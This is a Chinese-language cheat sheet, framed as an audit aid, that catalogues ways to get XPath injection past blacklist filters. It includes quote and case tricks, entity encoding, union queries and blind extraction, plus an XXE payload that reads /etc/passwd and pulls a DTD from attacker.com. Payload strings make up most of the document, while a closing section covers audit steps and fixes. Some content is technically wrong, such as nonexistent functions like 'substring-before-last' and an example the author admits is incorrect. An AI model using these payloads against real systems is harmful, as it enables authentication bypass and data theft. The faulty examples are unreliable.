# XPath 注入绕过技巧

本文档汇总常见的 XPath 注入防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. 引号和分隔符绕过

### 1.1 引号类型混合

**防护机制**：简单的引号过滤

```python
# 防护代码（不完整）
def sanitize_xpath(user_input):
    # 仅过滤单引号
    return user_input.replace("'", "\\'")
```

**绕过技巧**：

#### 方式 1：混合引号
```xpath
原始被拦截：' or '1'='1
绕过：" or "1"="1
混合双引号和单引号
```

#### 方式 2：不使用引号
```xpath
原始被拦截：' or '1'='1
绕过：' or 1=1 or '
或者：' or string-length(name())>0 or '
使用函数而不是字符串比较
```

#### 方式 3：XPath 中的字符串连接
```xpath
原始：username='admin' and password='pass'
绕过：username=concat('ad','min') and password=concat('pa','ss')
```

#### 方式 4：空字符串
```xpath
原始被拦截：' or '1'='1
绕过：' or ''='
空字符串比较
```

### 1.2 括号和逻辑运算符绕过

**防护机制**：检查 or 和 and 操作符

```java
// 防护代码（不完整）
if (xpath.contains(" or ") || xpath.contains(" and ")) {
    throw new SecurityException("Injection detected");
}
```

**绕过技巧**：

#### 方式 1：大小写混合
```xpath
原始被拦截：' or '1'='1
绕过：' OR '1'='1
     ' Or '1'='1
     ' oR '1'='1
```

#### 方式 2：额外空格
```xpath
绕过：'  or  '1'='1
使用多个空格
```

#### 方式 3：换行和制表符
```xpath
绕过：' or
'1'='1
或：' or	'1'='1  (制表符)
```

#### 方式 4：XPath 函数替代
```xpath
原始被拦截：' or '
绕过：' | '  (XPath union 操作符)
或：' | //*  (获取所有元素)
```

---

## 2. 注释绕过

### 2.1 XPath 中的注释

**防护机制**：不考虑 XPath 注释

```php
// 防护代码
if (preg_match('/or|and|=/', $xpath)) {
    die("Injection detected");
}
```

**绕过技巧**：

#### 方式 1：使用 comment 节点
```xpath
原始被拦截：' or '1'='1
绕过：' or comment()='' or '
在 comment() 前进行操作
```

#### 方式 2：使用 processing instructions
```xpath
绕过：' or processing-instruction()='' or '
```

---

## 3. 函数基于的绕过

### 3.1 字符串函数绕过

**防护机制**：黑名单禁用某些函数

```python
# 防护代码（易受影响）
dangerous_functions = ['concat', 'substring', 'string-length']
for func in dangerous_functions:
    if func in user_input:
        raise ValueError(f"{func} is not allowed")
```

**绕过技巧**：

#### 方式 1：使用替代函数
```xpath
原始被拦截：concat('a','b')
绕过：substring-before('ab','b')  # 返回 'a'
      substring-after('ab','a')   # 返回 'b'
      translate('abc','bc','')    # 删除字符
```

#### 方式 2：使用数学函数
```xpath
原始被拦截：'1'='1
绕过：1=1  # 数字比较
      ceil(0.5)=1  # 使用数学函数
      floor(1.5)=1
```

#### 方式 3：使用节点函数
```xpath
原始被拦截：count(//user)>0
绕过：position()>0
      last()>0
      name()=name()  # 节点名等于自己
```

#### 方式 4：字符串转数字
```xpath
原始：//*[name='1' or name='2']
绕过：//*[number(name)=1 or number(name)=2]
```

### 3.2 聚合函数绕过

**防护机制**：禁用 count、sum 等函数

```javascript
// 防护代码（易受影响）
const blocked = ['count', 'sum', 'avg', 'min', 'max'];
if (blocked.some(fn => xpath.includes(fn))) {
    throw new Error("Function not allowed");
}
```

**绕过技巧**：

#### 方式 1：使用替代聚合函数
```xpath
原始被拦截：count(//*) > 10
绕过：sum(//*[1]) > 0  # 返回数字节点的和
      string-length(name(//*[1])) > 0
```

#### 方式 2：循环和位置
```xpath
原始被拦截：//user[count(.)>0]
绕过：//user[position() > 0]
      //user[last() > 0]
```

---

## 4. 节点选择绕过

### 4.1 轴和谓词绕过

**防护机制**：限制 XPath 轴的使用

```php
// 防护代码（易受影响）
if (preg_match('/parent::|ancestor::|following::/', $xpath)) {
    die("Axis not allowed");
}
```

**绕过技巧**：

#### 方式 1：使用替代轴
```xpath
原始被拦截：//*[parent::root]
绕过：//*[../*[name()='root']]  # 使用 .. (parent 简写)
      //*/../*  # 向上然后向下
```

#### 方式 2：使用 ancestor-or-self
```xpath
绕过：//*[ancestor-or-self::root]
      //*[ancestor-or-self::*[name()='root']]
```

#### 方式 3：谓词组合
```xpath
原始：//user[@id='1']
绕过：//user[substring(@id,1,1)='1']
      //user[starts-with(@id,'1')]
      //user[contains(@id,'1')]
```

#### 方式 4：属性存在性检查
```xpath
原始被拦截：//*[@admin='true']
绕过：//*[@admin]  # 只检查属性是否存在
      //*[boolean(@admin)]  # 转换为布尔值
```

### 4.2 通配符和递归下降绕过

**防护机制**：限制 // 和 * 的使用

```python
# 防护代码（易受影响）
if '//' in xpath or '*' in xpath:
    raise ValueError("Wildcard not allowed")
```

**绕过技巧**：

#### 方式 1：使用确切的路径
```xpath
原始被拦截：//user
绕过：/root/user  # 使用确切的路径
      /root/*/user  # 使用单个 *
```

#### 方式 2：使用 | (union)
```xpath
原始被拦截：//user
绕过：/root/user | /admin/user  # 并集
```

#### 方式 3：使用索引
```xpath
原始被拦截：//*
绕过：/root/*[1] | /root/*[2] | /root/*[3]
      /root/*[position()>0]
```

---

## 5. 布尔逻辑绕过

### 5.1 逻辑表达式绕过

**防护机制**：基于逻辑操作符的检查

```java
// 防护代码（易受影响）
String query = userInput;
if (query.matches(".*\\b(or|and)\\b.*")) {
    throw new SecurityException();
}
```

**绕过技巧**：

#### 方式 1：not 操作符
```xpath
原始被拦截：' or '1'='1
绕过：' and not('1'='2')  # not false = true
```

#### 方式 2：比较链
```xpath
原始：name='admin' and password='pass'
绕过：name>'admin'[not(1)] and password>'pass'[not(1)]
      (看起来不对，但演示逻辑绕过)

正确的例子：
绕过：name=concat('a','dmin') and password=concat('p','ass')
```

#### 方式 3：使用 if-then-else
```xpath
绕过：if (1=1) then '1' else '0'
```

#### 方式 4：隐式布尔转换
```xpath
原始被拦截：' or '1'='1
绕过：' | comment()[1] or '  # 使用节点
      ' | //*[1] or '  # 返回节点集合，隐式转换为 true
```

---

## 6. 类型强制和转换绕过

### 6.1 隐式类型转换

**防护机制**：检查字符串操作

```python
# 防护代码（易受影响）
if "'" in user_input or '"' in user_input:
    raise ValueError("Quote not allowed")
```

**绕过技巧**：

#### 方式 1：使用数字而不是字符串
```xpath
原始被拦截：username='admin'
绕过：substring-before(concat('a','dmin'),'d')='a'
      number('1')=1
```

#### 方式 2：节点集转字符串
```xpath
原始被拦截：name='admin'
绕过：substring(name,1,5)='admin'
      (节点自动转换为字符串)
```

#### 方式 3：布尔上下文
```xpath
原始被拦截：' or '1'='1
绕过：' or count(/node[boolean(1)])>0 or '
      使用布尔上下文的隐式转换
```

---

## 7. XML 外部实体 (XXE) 组合

### 7.1 XPath 中的 XXE

**防护机制**：不考虑 XXE 与 XPath 的组合

```xml
<!-- XML 实体定义 -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user>
    <name>&xxe;</name>
  </user>
</root>
```

**绕过技巧**：

#### 方式 1：通过 XPath 查询 XXE 数据
```xpath
原始：/root/user[name='&xxe;']
实际执行：/root/user[name='root:x:0:0:...']  # XXE 已展开
```

#### 方式 2：参数化 XXE
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

---

## 8. XML 实体和字符参考绕过

### 8.1 字符参考编码

**防护机制**：检查特殊字符

```php
// 防护代码（易受影响）
if (preg_match("/['\"]|or|and/i", $input)) {
    die("Injection blocked");
}
```

**绕过技巧**：

#### 方式 1：十进制字符参考
```xpath
原始被拦截：' or '1'='1
绕过：&#39; or &#39;1&#39;=&#39;1
      &#x27; or &#x27;1&#x27;=&#x27;1  (十六进制)
```

#### 方式 2：XML 实体
```xpath
绕过：&apos; or &apos;1&apos;=&apos;1
```

#### 方式 3：混合编码
```xpath
绕过：' or &#39;1&#39;=&#39;1
      &apos; or '1'='1
```

---

## 9. 长度和性能相关绕过

### 9.1 递归和深度限制绕过

**防护机制**：限制 XPath 查询的深度或长度

```python
# 防护代码（易受影响）
MAX_QUERY_LENGTH = 100
if len(xpath_query) > MAX_QUERY_LENGTH:
    raise ValueError("Query too long")
```

**绕过技巧**：

#### 方式 1：使用短函数名
```xpath
原始（长）：substring-before-last(...)
绕过（短）：substring-before(...)
      sub(...)  # 如果别名可用
```

#### 方式 2：链式调用压缩
```xpath
原始（多行）：
/root
  /user
    [name='admin']
      /password

绕过（单行）：/root/user[name='admin']/password
```

#### 方式 3：使用缩写轴
```xpath
原始（长）：/child::root/child::user[attribute::id='1']
绕过（短）：/root/user[@id='1']
```

---

## 10. 特定 XPath 库绕过

### 10.1 libxml2 绕过

**防护机制**：基于 libxml2 的防护

```c
// 防护代码（易受影响）
xmlXPathEvalExpression((const xmlChar*)user_input, ctx);
```

**绕过技巧**：

#### 方式 1：使用 XPath 2.0 语法
```xpath
原始（XPath 1.0）：//*[name='admin']
绕过（XPath 2.0）：//*[name eq 'admin']  # eq 操作符
```

#### 方式 2：使用命名空间
```xpath
绕过：/*[local-name()='admin']
      /*[namespace-uri()='http://example.com']
```

### 10.2 DOM4j 和 JDOM 绕过

**防护机制**：Java XPath 实现的限制

```java
// 防护代码（易受影响）
XPath xpath = DocumentHelper.createXPath(user_input);
List<?> results = xpath.selectNodes(document);
```

**绕过技巧**：

#### 方式 1：使用 XPath 变量
```java
XPath xpath = DocumentHelper.createXPath("//user[@id=$uid]");
xpath.addVariable("uid", user_input);  // 如果应用直接使用用户输入
```

#### 方式 2：使用前缀
```xpath
原始被拦截：//user
绕过：//*[local-name()='user']
      //ns:user  (如果命名空间允许)
```

### 10.3 lxml (Python) 绕过

**防护机制**：Python lxml 的防护

```python
# 防护代码（易受影响）
root = etree.fromstring(xml_content)
results = root.xpath(user_input)
```

**绕过技巧**：

#### 方式 1：使用 XPath 变量
```python
# 如果应用允许变量
xpath = "//user[name=$name]"
results = root.xpath(xpath, name=user_input)

# 绕过：直接拼接
xpath = f"//user[name='{user_input}']"
```

#### 方式 2：使用文本节点
```xpath
绕过：//user/name/text()='admin'
      //user[text()='admin']
```

---

## 11. 时间盲注和布尔盲注

### 11.1 布尔盲注

**防护机制**：不显示 XPath 错误，只返回匹配或不匹配

```php
// 防护代码（易受影响）
$users = $xpath->query($user_xpath);
if ($users->length > 0) {
    echo "User found";
} else {
    echo "User not found";
}
```

**绕过技巧**：

#### 方式 1：逐字符猜测
```xpath
步骤1：//*[starts-with(name(),'a')]  # 检查是否以 'a' 开头
步骤2：//*[starts-with(name(),'ad')]  # 检查是否以 'ad' 开头
步骤3：//*[starts-with(name(),'adm')]  # 继续...
...
结果：逐个猜测出 'admin'
```

#### 方式 2：使用字符串长度
```xpath
//user[string-length(name)=5]  # 长度是否为 5
//user[string-length(name)>4]  # 长度是否大于 4
```

#### 方式 3：子字符串比较
```xpath
//user[substring(name,1,1)='a']
//user[substring(name,2,1)='d']
//user[substring(name,3,1)='m']
...
```

### 11.2 时间盲注

**防护机制**：缺少超时保护

```python
# 防护代码（易受影响）
# 没有查询超时
results = root.xpath(complex_xpath)
```

**绕过技巧**：

#### 方式 1：递归查询导致性能下降
```xpath
//node[count(following::node) > count(preceding::node) and
      count(following::node) > count(preceding::node) and
      ...]
```

#### 方式 2：复杂的字符串操作
```xpath
//user[
  substring(name,1,1)='a' and
  substring(name,2,1)='d' and
  substring(name,3,1)='m' and
  ... (很多条件)
]
```

---

## 12. 多步骤注入和链式攻击

### 12.1 组合多个 XPath 查询

**防护机制**：各个查询分别过滤

```java
// 防护代码（易受影响）
String step1 = sanitize(userStep1);
String step2 = sanitize(userStep2);

XPath xpath = DocumentHelper.createXPath(step1 + step2);
```

**绕过技巧**：

#### 方式 1：跨越多个查询的注入
```
步骤1（过滤后）：//user
步骤2（过滤后）：[@id='1']
组合后：//user[@id='1']
绕过：在步骤1或步骤2中各注入一部分
```

#### 方式 2：利用连接点
```xpath
步骤1 结果：//user (某个过滤了逻辑操作符)
步骤2 注入：[1] | //admin
最终：//user[1] | //admin
```

---

## 13. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 引号过滤 | 低 | 混合引号、数字、函数 |
| or/and 检查 | 低 | 大小写、空格、替代函数 |
| 特殊字符黑名单 | 低 | 字符参考、编码、函数 |
| 函数黑名单 | 中 | 替代函数、数学运算 |
| 轴限制 | 中 | 替代轴、简写语法 |
| 长度限制 | 中 | 缩写、压缩、链式调用 |
| 文库特定防护 | 中-高 | 版本差异、配置漏洞 |
| 盲注保护 | 高 | 慢速推断、侧通道 |

---

## 14. 审计建议

### 高风险指标
- 直接拼接用户输入到 XPath 查询
- 过滤基于黑名单（只禁止某些关键词）
- 缺少对特殊字符的编码处理
- 允许在 XPath 中访问任意 XML 属性
- 缺少查询长度或复杂度限制
- 不使用 XPath 参数化或预编译查询
- 返回详细的错误信息，便于攻击者调试

### 审计步骤
1. **定位 XPath 查询代码**：搜索 XPath、query、select 等关键词
2. **追踪用户输入**：确认用户输入如何到达 XPath 查询
3. **识别 XPath 库**：确认使用的是哪个 XPath 库（libxml2, DOM4j, lxml 等）
4. **测试基本注入**：尝试简单的 XPath 注入（如 `' or '1'='1`）
5. **测试编码绕过**：使用字符参考、实体等绕过过滤
6. **测试函数绕过**：使用替代函数和数学运算
7. **测试盲注**：如果结果不可见，使用布尔或时间盲注
8. **测试多层注入**：检查是否有多个 XPath 查询点
9. **生成报告**：记录所有发现的 XPath 注入漏洞

### 验证修复
修复 XPath 注入漏洞时，确保：
- 使用参数化查询而非字符串拼接
- 如果必须拼接，使用白名单而非黑名单
- 对所有用户输入进行严格验证
- 使用 XPath 库提供的转义函数
- 避免返回详细的错误信息
- 实施查询超时和复杂度限制
- 定期更新 XPath 库到最新版本
- 对敏感操作启用审计和日志记录
